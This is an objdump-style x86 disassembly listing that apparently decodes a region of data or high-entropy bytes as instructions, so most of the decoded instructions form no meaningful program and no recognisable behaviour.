  4051f1:	10 2c 69             	adc    %ch,(%ecx,%ebp,2)
  4051f4:	10 08                	adc    %cl,(%eax)
  4051f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051f7:	f0 3a 20             	lock cmp (%eax),%ah
  4051fa:	dd 30                	fnsave (%eax)
  4051fc:	33 20                	xor    (%eax),%esp
  4051fe:	70 07                	jo     0x405207
  405200:	ff 9a 11 65 00 0f    	lcall  *0xf006511(%edx)
  405206:	00 1f                	add    %bl,(%edi)
  405208:	01 ff                	add    %edi,%edi
  40520a:	1f                   	pop    %ds
  40520b:	01 1f                	add    %ebx,(%edi)
  40520d:	01 1f                	add    %ebx,(%edi)
  40520f:	01 1f                	add    %ebx,(%edi)
  405211:	01 1f                	add    %ebx,(%edi)
  405213:	01 1f                	add    %ebx,(%edi)
  405215:	01 1f                	add    %ebx,(%edi)
  405217:	01 1f                	add    %ebx,(%edi)
  405219:	01 ff                	add    %edi,%edi
  40521b:	1f                   	pop    %ds
  40521c:	01 1f                	add    %ebx,(%edi)
  40521e:	01 1f                	add    %ebx,(%edi)
  405220:	01 1f                	add    %ebx,(%edi)
  405222:	01 1f                	add    %ebx,(%edi)
  405224:	01 1f                	add    %ebx,(%edi)
  405226:	01 1f                	add    %ebx,(%edi)
  405228:	01 1f                	add    %ebx,(%edi)
  40522a:	01 ff                	add    %edi,%edi
  40522c:	1f                   	pop    %ds
  40522d:	01 1f                	add    %ebx,(%edi)
  40522f:	01 1f                	add    %ebx,(%edi)
  405231:	01 1f                	add    %ebx,(%edi)
  405233:	01 1f                	add    %ebx,(%edi)
  405235:	01 1f                	add    %ebx,(%edi)
  405237:	01 1f                	add    %ebx,(%edi)
  405239:	01 1f                	add    %ebx,(%edi)
  40523b:	01 ff                	add    %edi,%edi
  40523d:	1f                   	pop    %ds
  40523e:	01 1f                	add    %ebx,(%edi)
  405240:	01 1f                	add    %ebx,(%edi)
  405242:	01 1f                	add    %ebx,(%edi)
  405244:	01 1f                	add    %ebx,(%edi)
  405246:	01 1f                	add    %ebx,(%edi)
  405248:	01 1f                	add    %ebx,(%edi)
  40524a:	01 1f                	add    %ebx,(%edi)
  40524c:	01 ff                	add    %edi,%edi
  40524e:	1f                   	pop    %ds
  40524f:	01 1f                	add    %ebx,(%edi)
  405251:	01 1f                	add    %ebx,(%edi)
  405253:	01 1f                	add    %ebx,(%edi)
  405255:	01 1f                	add    %ebx,(%edi)
  405257:	01 1f                	add    %ebx,(%edi)
  405259:	01 1f                	add    %ebx,(%edi)
  40525b:	01 1f                	add    %ebx,(%edi)
  40525d:	01 ff                	add    %edi,%edi
  40525f:	1f                   	pop    %ds
  405260:	01 1f                	add    %ebx,(%edi)
  405262:	01 1f                	add    %ebx,(%edi)
  405264:	01 1f                	add    %ebx,(%edi)
  405266:	01 1f                	add    %ebx,(%edi)
  405268:	01 1f                	add    %ebx,(%edi)
  40526a:	01 1f                	add    %ebx,(%edi)
  40526c:	01 1f                	add    %ebx,(%edi)
  40526e:	01 ff                	add    %edi,%edi
  405270:	1f                   	pop    %ds
  405271:	01 1f                	add    %ebx,(%edi)
  405273:	01 1f                	add    %ebx,(%edi)
  405275:	01 1f                	add    %ebx,(%edi)
  405277:	01 1f                	add    %ebx,(%edi)
  405279:	01 1f                	add    %ebx,(%edi)
  40527b:	01 1f                	add    %ebx,(%edi)
  40527d:	01 1f                	add    %ebx,(%edi)
  40527f:	01 ff                	add    %edi,%edi
  405281:	1f                   	pop    %ds
  405282:	01 1f                	add    %ebx,(%edi)
  405284:	01 1f                	add    %ebx,(%edi)
  405286:	01 1f                	add    %ebx,(%edi)
  405288:	01 1f                	add    %ebx,(%edi)
  40528a:	01 1f                	add    %ebx,(%edi)
  40528c:	01 1f                	add    %ebx,(%edi)
  40528e:	01 1f                	add    %ebx,(%edi)
  405290:	01 ff                	add    %edi,%edi
  405292:	1f                   	pop    %ds
  405293:	01 1f                	add    %ebx,(%edi)
  405295:	01 1f                	add    %ebx,(%edi)
  405297:	01 1f                	add    %ebx,(%edi)
  405299:	01 1f                	add    %ebx,(%edi)
  40529b:	01 1f                	add    %ebx,(%edi)
  40529d:	01 1f                	add    %ebx,(%edi)
  40529f:	01 1f                	add    %ebx,(%edi)
  4052a1:	01 7f 1f             	add    %edi,0x1f(%edi)
  4052a4:	01 1f                	add    %ebx,(%edi)
  4052a6:	01 1f                	add    %ebx,(%edi)
  4052a8:	01 1f                	add    %ebx,(%edi)
  4052aa:	01 1f                	add    %ebx,(%edi)
  4052ac:	01 1f                	add    %ebx,(%edi)
  4052ae:	01 1a                	add    %ebx,(%edx)
  4052b0:	01 03                	add    %eax,(%ebx)
  4052b2:	b0 02                	mov    $0x2,%al
  4052b4:	00 fc                	add    %bh,%ah
  4052b6:	0f 03 b0 02 00 fc 0f 	lsl    0xffc0002(%eax),%esi
  4052bd:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052c3:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052c9:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052cf:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052d5:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052db:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052e1:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052e7:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052ed:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
  4052f3:	03 b0 02 00 fc 0f    	add    0xffc0002(%eax),%esi
	...
  405bfd:	00 00                	add    %al,(%eax)
  405bff:	00 1a                	add    %bl,(%edx)
  405c01:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405c02:	77 da                	ja     0x405bde
  405c04:	90                   	nop
  405c05:	8a 11                	mov    (%ecx),%dl
  405c07:	f6 49 50 78          	testb  $0x78,0x50(%ecx)
  405c0b:	e3 2a                	jecxz  0x405c37
  405c0d:	83 cf 28             	or     $0x28,%edi
  405c10:	3c db                	cmp    $0xdb,%al
  405c12:	2a ad 6f 51 ea 6f    	sub    0x6fea516f(%ebp),%ch
  405c18:	ec                   	in     (%dx),%al
  405c19:	1b 97 8d 19 fb 28    	sbb    0x28fb198d(%edi),%edx
  405c1f:	b4 e2                	mov    $0xe2,%ah
  405c21:	d2 98 4b 55 1c 43    	rcrb   %cl,0x431c554b(%eax)
  405c27:	d1 ef                	shr    $1,%edi
  405c29:	7e 1f                	jle    0x405c4a
  405c2b:	b5 01                	mov    $0x1,%ch
  405c2d:	95                   	xchg   %eax,%ebp
  405c2e:	8a 2a                	mov    (%edx),%ch
  405c30:	28 db                	sub    %bl,%bl
  405c32:	d9 f3                	fpatan
  405c34:	88 65 cf             	mov    %ah,-0x31(%ebp)
  405c37:	6d                   	insl   (%dx),%es:(%edi)
  405c38:	d3 67 d3             	shll   %cl,-0x2d(%edi)
  405c3b:	ea 73 ad fa c4 a7 ab 	ljmp   $0xaba7,$0xc4faad73
  405c42:	94                   	xchg   %eax,%esp
  405c43:	84 66 59             	test   %ah,0x59(%esi)
  405c46:	c3                   	ret
  405c47:	97                   	xchg   %eax,%edi
  405c48:	09 e8                	or     %ebp,%eax
  405c4a:	93                   	xchg   %eax,%ebx
  405c4b:	6a 74                	push   $0x74
  405c4d:	6f                   	outsl  %ds:(%esi),(%dx)
  405c4e:	6a 0c                	push   $0xc
  405c50:	cb                   	lret
  405c51:	29 4e 03             	sub    %ecx,0x3(%esi)
  405c54:	be d1 c7 e0 54       	mov    $0x54e0c7d1,%esi
  405c59:	93                   	xchg   %eax,%ebx
  405c5a:	a2 44 d8 8c 87       	mov    %al,0x878cd844
  405c5f:	a2 48 6e 49 8a       	mov    %al,0x8a496e48
  405c64:	80 29 a6             	subb   $0xa6,(%ecx)
  405c67:	0c dd                	or     $0xdd,%al
  405c69:	e0 4a                	loopne 0x405cb5
  405c6b:	d6                   	salc
  405c6c:	f5                   	cmc
  405c6d:	1a fb                	sbb    %bl,%bh
  405c6f:	3d be cf 78 75       	cmp    $0x7578cfbe,%eax
  405c74:	63 59 65             	arpl   %ebx,0x65(%ecx)
  405c77:	5c                   	pop    %esp
  405c78:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c79:	97                   	xchg   %eax,%edi
  405c7a:	79 bb                	jns    0x405c37
  405c7c:	bd e1 f7 6e c0       	mov    $0xc06ef7e1,%ebp
  405c81:	69 8b 71 fb 96 99 22 	imul   $0x3136a522,-0x6669048f(%ebx),%ecx
  405c88:	a5 36 31 
  405c8b:	45                   	inc    %ebp
  405c8c:	89 1d ee 9c 8a cb    	mov    %ebx,0xcb8a9cee
  405c92:	62 ab 1e 11 3a aa    	bound  %ebp,-0x55c5eee2(%ebx)
  405c98:	91                   	xchg   %eax,%ecx
  405c99:	ce                   	into
  405c9a:	64 2c 2b             	fs sub $0x2b,%al
  405c9d:	8c 37                	mov    %?,(%edi)
  405c9f:	d6                   	salc
  405ca0:	da 06                	fiaddl (%esi)
  405ca2:	fe 08                	decb   (%eax)
  405ca4:	72 f0                	jb     0x405c96
  405ca6:	0b a6 39 cf 02 59    	or     0x5902cf39(%esi),%esp
  405cac:	4b                   	dec    %ebx
  405cad:	89 42 d3             	mov    %eax,-0x2d(%edx)
  405cb0:	7f 76                	jg     0x405d28
  405cb2:	6b c7 f7             	imul   $0xfffffff7,%edi,%eax
  405cb5:	5c                   	pop    %esp
  405cb6:	3f                   	aas
  405cb7:	11 fa                	adc    %edi,%edx
  405cb9:	50                   	push   %eax
  405cba:	12 c6                	adc    %dh,%al
  405cbc:	59                   	pop    %ecx
  405cbd:	dc 17                	fcoml  (%edi)
  405cbf:	2f                   	das
  405cc0:	67 f4                	addr16 hlt
  405cc2:	9f                   	lahf
  405cc3:	ca 07 8c             	lret   $0x8c07
  405cc6:	11 d1                	adc    %edx,%ecx
  405cc8:	6a 4e                	push   $0x4e
  405cca:	b4 e4                	mov    $0xe4,%ah
  405ccc:	5a                   	pop    %edx
  405ccd:	7c f2                	jl     0x405cc1
  405ccf:	15 28 fd 39 cc       	adc    $0xcc39fd28,%eax
  405cd4:	8c 98 e6 d1 12 21    	mov    %ds,0x2112d1e6(%eax)
  405cda:	12 0a                	adc    (%edx),%cl
  405cdc:	96                   	xchg   %eax,%esi
  405cdd:	59                   	pop    %ecx
  405cde:	70 9b                	jo     0x405c7b
  405ce0:	ee                   	out    %al,(%dx)
  405ce1:	26 2a 86 1f 20 48 5c 	sub    %es:0x5c48201f(%esi),%al
  405ce8:	66 82 70 f3 59       	data16 xorb $0x59,-0xd(%eax)
  405ced:	6d                   	insl   (%dx),%es:(%edi)
  405cee:	59                   	pop    %ecx
  405cef:	84 6e ef             	test   %ch,-0x11(%esi)
  405cf2:	2d c3 fb 76 f7       	sub    $0xf776fbc3,%eax
  405cf7:	a0 e6 93 50 1a       	mov    0x1a5093e6,%al
  405cfc:	95                   	xchg   %eax,%ebp
  405cfd:	1a ee                	sbb    %dh,%ch
  405cff:	c4 9e da b8 dc 85    	les    -0x7a234726(%esi),%ebx
  405d05:	54                   	push   %esp
  405d06:	8d 88 ed b8 09 16    	lea    0x1609b8ed(%eax),%ecx
  405d0c:	54                   	push   %esp
  405d0d:	26 59                	es pop %ecx
  405d0f:	67 0d ca 37 09 e3    	addr16 or $0xe30937ca,%eax
  405d15:	92                   	xchg   %eax,%edx
  405d16:	c2 a3 ab             	ret    $0xaba3
  405d19:	94                   	xchg   %eax,%esp
  405d1a:	7a 4a                	jp     0x405d66
  405d1c:	ba 6e 37 b8 f3       	mov    $0xf3b8376e,%edx
  405d21:	bc 0b cb bf 97       	mov    $0x97bfcb0b,%esp
  405d26:	04 c3                	add    $0xc3,%al
  405d28:	4e                   	dec    %esi
  405d29:	b6 60                	mov    $0x60,%dh
  405d2b:	aa                   	stos   %al,%es:(%edi)
  405d2c:	e5 42                	in     $0x42,%eax
  405d2e:	b6 ae                	mov    $0xae,%dh
  405d30:	ba d4 7b 4d cb       	mov    $0xcb4d7bd4,%edx
  405d35:	38 f4                	cmp    %dh,%ah
  405d37:	c0 4a 91 5c          	rorb   $0x5c,-0x6f(%edx)
  405d3b:	eb e7                	jmp    0x405d24
  405d3d:	dd 04 e7             	fldl   (%edi,%eiz,8)
  405d40:	ae                   	scas   %es:(%edi),%al
  405d41:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d42:	e2 c3                	loop   0x405d07
  405d44:	29 cf                	sub    %ecx,%edi
  405d46:	3b 1e                	cmp    (%esi),%ebx
  405d48:	1b d4                	sbb    %esp,%edx
  405d4a:	f4                   	hlt
  405d4b:	07                   	pop    %es
  405d4c:	62 34 0d 93 66 5b dc 	bound  %esi,-0x23a4996d(,%ecx,1)
  405d53:	55                   	push   %ebp
  405d54:	54                   	push   %esp
  405d55:	68 dc 1c 4a e9       	push   $0xe94a1cdc
  405d5a:	9f                   	lahf
  405d5b:	82 e1 72             	and    $0x72,%cl
  405d5e:	4a                   	dec    %edx
  405d5f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d60:	e5 8e                	in     $0x8e,%eax
  405d62:	1f                   	pop    %ds
  405d63:	33 ca                	xor    %edx,%ecx
  405d65:	a3 33 10 a6 5f       	mov    %eax,0x5fa61033
  405d6a:	9f                   	lahf
  405d6b:	9d                   	popf
  405d6c:	0b 84 b8 80 05 6e 81 	or     -0x7e91fa80(%eax,%edi,4),%eax
  405d73:	65 62 e2 a8          	gs (bad) {ru-bad},{%k4}
  405d77:	54                   	push   %esp
  405d78:	e2 3b                	loop   0x405db5
  405d7a:	12 52 30             	adc    0x30(%edx),%dl
  405d7d:	8c ca                	mov    %cs,%edx
  405d7f:	90                   	nop
  405d80:	13 23                	adc    (%ebx),%esp
  405d82:	c6                   	(bad)
  405d83:	d9 bd d8 42 d6 7a    	fnstcw 0x7ad642d8(%ebp)
  405d89:	6e                   	outsb  %ds:(%esi),(%dx)
  405d8a:	7b 83                	jnp    0x405d0f
  405d8c:	55                   	push   %ebp
  405d8d:	20 32                	and    %dh,(%edx)
  405d8f:	12 71 36             	adc    0x36(%ecx),%dh
  405d92:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405d93:	13 69 f9             	adc    -0x7(%ecx),%ebp
  405d96:	6e                   	outsb  %ds:(%esi),(%dx)
  405d97:	1c 71                	sbb    $0x71,%al
  405d99:	9f                   	lahf
  405d9a:	3a 7b ba             	cmp    -0x46(%ebx),%bh
  405d9d:	14 20                	adc    $0x20,%al
  405d9f:	51                   	push   %ecx
  405da0:	b7 80                	mov    $0x80,%bh
  405da2:	e6 3d                	out    %al,$0x3d
  405da4:	f0 74 4d             	lock je 0x405df4
  405da7:	eb 86                	jmp    0x405d2f
  405da9:	b1 18                	mov    $0x18,%cl
  405dab:	65 50                	gs push %eax
  405dad:	4f                   	dec    %edi
  405dae:	2a f3                	sub    %bl,%dh
  405db0:	ac                   	lods   %ds:(%esi),%al
  405db1:	12 77 57             	adc    0x57(%edi),%dh
  405db4:	5b                   	pop    %ebx
  405db5:	05 25 44 45 4c       	add    $0x4c454425,%eax
  405dba:	2a 8a 2e 7b af ed    	sub    -0x125084d2(%edx),%cl
  405dc0:	9c                   	pushf
  405dc1:	70 b2                	jo     0x405d75
  405dc3:	9a 1e 32 a6 18 82 cd 	lcall  $0xcd82,$0x18a6321e
  405dca:	85 67 d5             	test   %esp,-0x2b(%edi)
  405dcd:	6e                   	outsb  %ds:(%esi),(%dx)
  405dce:	f9                   	stc
  405dcf:	84 c4                	test   %al,%ah
  405dd1:	5b                   	pop    %ebx
  405dd2:	fe                   	(bad)
  405dd3:	d6                   	salc
  405dd4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405dd5:	b2 72                	mov    $0x72,%dl
  405dd7:	63 c4                	arpl   %eax,%esp
  405dd9:	92                   	xchg   %eax,%edx
  405dda:	f5                   	cmc
  405ddb:	5a                   	pop    %edx
  405ddc:	b8 cd 12 42 9b       	mov    $0x9b4212cd,%eax
  405de1:	c2 44 ca             	ret    $0xca44
  405de4:	41                   	inc    %ecx
  405de5:	47                   	inc    %edi
  405de6:	9a 17 65 ba 80 db 9b 	lcall  $0x9bdb,$0x80ba6517
  405ded:	b6 22                	mov    $0x22,%dh
  405def:	23 5b 7b             	and    0x7b(%ebx),%ebx
  405df2:	af                   	scas   %es:(%edi),%eax
  405df3:	7e 35                	jle    0x405e2a
  405df5:	70 78                	jo     0x405e6f
  405df7:	79 b8                	jns    0x405db1
  405df9:	83 6a e3 52          	subl   $0x52,-0x1d(%edx)
  405dfd:	5a                   	pop    %edx
  405dfe:	e9 9b da de ee       	jmp    0xef1f389e
  405e03:	b1 85                	mov    $0x85,%cl
  405e05:	9d                   	popf
  405e06:	95                   	xchg   %eax,%ebp
  405e07:	48                   	dec    %eax
  405e08:	aa                   	stos   %al,%es:(%edi)
  405e09:	10 7b 79             	adc    %bh,0x79(%ebx)
  405e0c:	78 c1                	js     0x405dcf
  405e0e:	82 8b 5a b0 ec 78 75 	orb    $0x75,0x78ecb05a(%ebx)
  405e15:	16                   	push   %ss
  405e16:	56                   	push   %esi
  405e17:	a8 55                	test   $0x55,%al
  405e19:	9a ab 05 d4 9d 51 b7 	lcall  $0xb751,$0x9dd405ab
  405e20:	e1 9d                	loope  0x405dbf
  405e22:	55                   	push   %ebp
  405e23:	c9                   	leave
  405e24:	09 06                	or     %eax,(%esi)
  405e26:	48                   	dec    %eax
  405e27:	37                   	aaa
  405e28:	89 35 29 69 d6 69    	mov    %esi,0x69d66929
  405e2e:	fc                   	cld
  405e2f:	3b 94 ec 31 dc 77 c5 	cmp    -0x3a8823cf(%esp,%ebp,8),%edx
  405e36:	72 23                	jb     0x405e5b
  405e38:	c6                   	(bad)
  405e39:	92                   	xchg   %eax,%edx
  405e3a:	4c                   	dec    %esp
  405e3b:	c3                   	ret
  405e3c:	e1 95                	loope  0x405dd3
  405e3e:	97                   	xchg   %eax,%edi
  405e3f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405e40:	e9 19 75 64 5a       	jmp    0x5aa4d35e
  405e45:	b6 5d                	mov    $0x5d,%dh
  405e47:	ac                   	lods   %ds:(%esi),%al
  405e48:	79 fa                	jns    0x405e44
  405e4a:	5a                   	pop    %edx
  405e4b:	44                   	inc    %esp
  405e4c:	ab                   	stos   %eax,%es:(%edi)
  405e4d:	4b                   	dec    %ebx
  405e4e:	02 a4 6f 3f 5a 06 57 	add    0x57065a3f(%edi,%ebp,2),%ah
  405e55:	25 f8 b5 8a c4       	and    $0xc48ab5f8,%eax
  405e5a:	49                   	dec    %ecx
  405e5b:	53                   	push   %ebx
  405e5c:	5d                   	pop    %ebp
  405e5d:	16                   	push   %ss
  405e5e:	2d 89 d3 64 9b       	sub    $0x9b64d389,%eax
  405e63:	b4 29                	mov    $0x29,%ah
  405e65:	31 9b 6e 42 30 52    	xor    %ebx,0x5230426e(%ebx)
  405e6b:	4a                   	dec    %edx
  405e6c:	24 c9                	and    $0xc9,%al
  405e6e:	32 1e                	xor    (%esi),%bl
  405e70:	61                   	popa
  405e71:	c4 c3 fe d7          	(bad)
  405e75:	f3 99                	repz cltd
  405e77:	69 7f 25 1e 34 11 6d 	imul   $0x6d11341e,0x25(%edi),%edi
  405e7e:	48                   	dec    %eax
  405e7f:	73 c2                	jae    0x405e43
  405e81:	93                   	xchg   %eax,%ebx
  405e82:	b1 65                	mov    $0x65,%cl
  405e84:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405e85:	4b                   	dec    %ebx
  405e86:	66 36 e1 d8          	data16 ss loope 0x405e62
  405e8a:	f0 15 ce da da 4b    	lock adc $0x4bdadace,%eax
  405e90:	7b b3                	jnp    0x405e45
  405e92:	55                   	push   %ebp
  405e93:	ed                   	in     (%dx),%eax
  405e94:	ea c5 08 ba e2 bb c4 	ljmp   $0xc4bb,$0xe2ba08c5
  405e9b:	c1 bb 48 2a b7 dd 39 	sarl   $0x39,-0x2248d5b8(%ebx)
  405ea2:	aa                   	stos   %al,%es:(%edi)
  405ea3:	84 ca                	test   %cl,%dl
  405ea5:	3d 06 b7 45 a7       	cmp    $0xa745b706,%eax
  405eaa:	52                   	push   %edx
  405eab:	e4 ca                	in     $0xca,%al
  405ead:	6e                   	outsb  %ds:(%esi),(%dx)
  405eae:	97                   	xchg   %eax,%edi
  405eaf:	73 56                	jae    0x405f07
  405eb1:	6d                   	insl   (%dx),%es:(%edi)
  405eb2:	86 aa 54 38 10 9e    	xchg   %ch,-0x61efc7ac(%edx)
  405eb8:	9a d2 2c d9 f6 e3 e2 	lcall  $0xe2e3,$0xf6d92cd2
  405ebf:	86 2c b1             	xchg   %ch,(%ecx,%esi,4)
  405ec2:	1f                   	pop    %ds
  405ec3:	a3 bf 73 8e c6       	mov    %eax,0xc68e73bf
  405ec8:	14 f3                	adc    $0xf3,%al
  405eca:	78 fc                	js     0x405ec8
  405ecc:	05 38 d2 c0 cc       	add    $0xccc0d238,%eax
  405ed1:	c4 85 99 62 3c 94    	les    -0x6bc39d67(%ebp),%eax
  405ed7:	52                   	push   %edx
  405ed8:	d6                   	salc
  405ed9:	b9 4b 85 b5 ee       	mov    $0xeeb5854b,%ecx
  405ede:	71 2d                	jno    0x405f0d
  405ee0:	07                   	pop    %es
  405ee1:	89 1d b1 5b 59 05    	mov    %ebx,0x5595bb1
  405ee7:	f6 86 1d 6d df af ce 	testb  $0xce,-0x502092e3(%esi)
  405eee:	91                   	xchg   %eax,%ecx
  405eef:	7c b4                	jl     0x405ea5
  405ef1:	d6                   	salc
  405ef2:	35 b3 73 54 f5       	xor    $0xf55473b3,%eax
  405ef7:	0a a1 75 c2 a5 6a    	or     0x6aa5c275(%ecx),%ah
  405efd:	ed                   	in     (%dx),%eax
  405efe:	4d                   	dec    %ebp
  405eff:	db 52 2d             	fistl  0x2d(%edx)
  405f02:	16                   	push   %ss
  405f03:	95                   	xchg   %eax,%ebp
  405f04:	6c                   	insb   (%dx),%es:(%edi)
  405f05:	cd ac                	int    $0xac
  405f07:	c3                   	ret
  405f08:	d3 0d 28 d5 89 34    	rorl   %cl,0x3489d528
  405f0e:	e9 9f 8b 57 e8       	jmp    0xe897eab2
  405f13:	b5 0a                	mov    $0xa,%ch
  405f15:	b0 cd                	mov    $0xcd,%al
  405f17:	98                   	cwtl
  405f18:	73 af                	jae    0x405ec9
  405f1a:	b8 ce c5 87 0e       	mov    $0xe87c5ce,%eax
  405f1f:	9e                   	sahf
  405f20:	c4 16                	les    (%esi),%edx
  405f22:	22 22                	and    (%edx),%ah
  405f24:	c4 90 ae 49 9e a0    	les    -0x5f61b652(%eax),%edx
  405f2a:	04 d0                	add    $0xd0,%al
  405f2c:	eb 4b                	jmp    0x405f79
  405f2e:	fd                   	std
  405f2f:	e3 b9                	jecxz  0x405eea
  405f31:	99                   	cltd
  405f32:	37                   	aaa
  405f33:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405f34:	2a b4 a8 a2 23 f5 8a 	sub    -0x750adc5e(%eax,%ebp,4),%dh
  405f3b:	33 5c 6e 3e          	xor    0x3e(%esi,%ebp,2),%ebx
  405f3f:	0b cb                	or     %ebx,%ecx
  405f41:	ad                   	lods   %ds:(%esi),%eax
  405f42:	11 41 49             	adc    %eax,0x49(%ecx)
  405f45:	84 28                	test   %ch,(%eax)
  405f47:	98                   	cwtl
  405f48:	cb                   	lret
  405f49:	c3                   	ret
  405f4a:	bd 40 dd e3 ed       	mov    $0xede3dd40,%ebp
  405f4f:	76 7d                	jbe    0x405fce
  405f51:	f1                   	int1
  405f52:	ad                   	lods   %ds:(%esi),%eax
  405f53:	5c                   	pop    %esp
  405f54:	bf d5 9a b5 83       	mov    $0x83b59ad5,%edi
  405f59:	41                   	inc    %ecx
  405f5a:	22 c0                	and    %al,%al
  405f5c:	d4 2d                	aam    $0x2d
  405f5e:	52                   	push   %edx
  405f5f:	ba 34 ea c7 9f       	mov    $0x9fc7ea34,%edx
  405f64:	4e                   	dec    %esi
  405f65:	aa                   	stos   %al,%es:(%edi)
  405f66:	69 e5 0f 49 23 da    	imul   $0xda23490f,%ebp,%esp
  405f6c:	56                   	push   %esi
  405f6d:	3c 3b                	cmp    $0x3b,%al
  405f6f:	07                   	pop    %es
  405f70:	53                   	push   %ebx
  405f71:	a8 14                	test   $0x14,%al
  405f73:	f7 27                	mull   (%edi)
  405f75:	b7 45                	mov    $0x45,%bh
  405f77:	b3 eb                	mov    $0xeb,%bl
  405f79:	5a                   	pop    %edx
  405f7a:	81 32 a7 54 d5 47    	xorl   $0x47d554a7,(%edx)
  405f80:	24 04                	and    $0x4,%al
  405f82:	e2 b6                	loop   0x405f3a
  405f84:	bf 10 78 fd 84       	mov    $0x84fd7810,%edi
  405f89:	67 aa                	stos   %al,%es:(%di)
  405f8b:	1e                   	push   %ds
  405f8c:	da 00                	fiaddl (%eax)
  405f8e:	4a                   	dec    %edx
  405f8f:	98                   	cwtl
  405f90:	b2 ca                	mov    $0xca,%dl
  405f92:	19 c2                	sbb    %eax,%edx
  405f94:	8b 68 94             	mov    -0x6c(%eax),%ebp
  405f97:	b1 82                	mov    $0x82,%cl
  405f99:	8b 59 72             	mov    0x72(%ecx),%ebx
  405f9c:	ed                   	in     (%dx),%eax
  405f9d:	af                   	scas   %es:(%edi),%eax
  405f9e:	15 d6 fc e8 2a       	adc    $0x2ae8fcd6,%eax
  405fa3:	96                   	xchg   %eax,%esi
  405fa4:	6e                   	outsb  %ds:(%esi),(%dx)
  405fa5:	8c ad f3 ba 3d e1    	mov    %gs,-0x1ec2450d(%ebp)
  405fab:	65 a9 69 0b c2 b5    	gs test $0xb5c20b69,%eax
  405fb1:	d7                   	xlat   %ds:(%ebx)
  405fb2:	b2 ef                	mov    $0xef,%dl
  405fb4:	84 5c eb db          	test   %bl,-0x25(%ebx,%ebp,8)
  405fb8:	9a cd 25 d3 1d 14 ac 	lcall  $0xac14,$0x1dd325cd
  405fbf:	f3 31 79 b5          	repz xor %edi,-0x4b(%ecx)
  405fc3:	aa                   	stos   %al,%es:(%edi)
  405fc4:	d5 9b                	aad    $0x9b
  405fc6:	51                   	push   %ecx
  405fc7:	94                   	xchg   %eax,%esp
  405fc8:	26 34 5e             	es xor $0x5e,%al
  405fcb:	7f 30                	jg     0x405ffd
  405fcd:	3a 8f b7 58 3a c3    	cmp    -0x3cc5a749(%edi),%cl
  405fd3:	15 fa f5 c9 a6       	adc    $0xa6c9f5fa,%eax
  405fd8:	1a 7f 02             	sbb    0x2(%edi),%bh
  405fdb:	98                   	cwtl
  405fdc:	c0 9d 2a f1 4b e5 26 	rcrb   $0x26,-0x1ab40ed6(%ebp)
  405fe3:	35 1a e8 b8 69       	xor    $0x69b8e81a,%eax
  405fe8:	d3 49 e6             	rorl   %cl,-0x1a(%ecx)
  405feb:	77 9d                	ja     0x405f8a
  405fed:	29 90 8d 0d 89 7c    	sub    %edx,0x7c890d8d(%eax)
  405ff3:	08 fe                	or     %bh,%dh
  405ff5:	ec                   	in     (%dx),%al
  405ff6:	35 c5 65 cb 51       	xor    $0x51cb65c5,%eax
  405ffb:	bf 41 68 76 e1       	mov    $0xe1766841,%edi
  406000:	17                   	pop    %ss
  406001:	57                   	push   %edi
  406002:	33 77 71             	xor    0x71(%edi),%esi
  406005:	7d 6d                	jge    0x406074
  406007:	bb 58 a3 3a d8       	mov    $0xd83aa358,%ebx
  40600c:	66 10 cf             	data16 adc %cl,%bh
  40600f:	d6                   	salc
  406010:	5b                   	pop    %ebx
  406011:	db 35 5e b0 b7 95    	(bad) 0x95b7b05e
  406017:	bd e6 f9 b1 e3       	mov    $0xe3b1f9e6,%ebp
  40601c:	ab                   	stos   %eax,%es:(%edi)
  40601d:	5f                   	pop    %edi
  40601e:	f5                   	cmc
  40601f:	ae                   	scas   %es:(%edi),%al
  406020:	f8                   	clc
  406021:	e6 5f                	out    %al,$0x5f
  406023:	58                   	pop    %eax
  406024:	ef                   	out    %eax,(%dx)
  406025:	9d                   	popf
  406026:	6c                   	insb   (%dx),%es:(%edi)
  406027:	bf 9b a7 c2 ad       	mov    $0xadc2a79b,%edi
  40602c:	5e                   	pop    %esi
  40602d:	d5 21                	aad    $0x21
  40602f:	7d ba                	jge    0x405feb
  406031:	6d                   	insl   (%dx),%es:(%edi)
  406032:	22 29                	and    (%ecx),%ch
  406034:	47                   	inc    %edi
  406035:	a2 db f4 8a 74       	mov    %al,0x748af4db
  40603a:	28 b4 9b 7e da a5 03 	sub    %dh,0x3a5da7e(%ebx,%ebx,4)
  406041:	ce                   	into
  406042:	1b df                	sbb    %edi,%ebx
  406044:	87 c1                	xchg   %eax,%ecx
  406046:	a1 c1 a7 c6 07       	mov    0x7c6a7c1,%eax
  40604b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40604c:	b8 f4 c9 4b 14       	mov    $0x144bc9f4,%eax
  406051:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406052:	4e                   	dec    %esi
  406053:	7e 4c                	jle    0x4060a1
  406055:	d7                   	xlat   %ds:(%ebx)
  406056:	e4 49                	in     $0x49,%al
  406058:	75 20                	jne    0x40607a
  40605a:	cd 31                	int    $0x31
  40605c:	99                   	cltd
  40605d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40605e:	55                   	push   %ebp
  40605f:	43                   	inc    %ebx
  406060:	ff 00                	incl   (%eax)
  406062:	c5 56 31             	lds    0x31(%esi),%edx
  406065:	e6 4c                	out    %al,$0x4c
  406067:	67 76 66             	addr16 jbe 0x4060d0
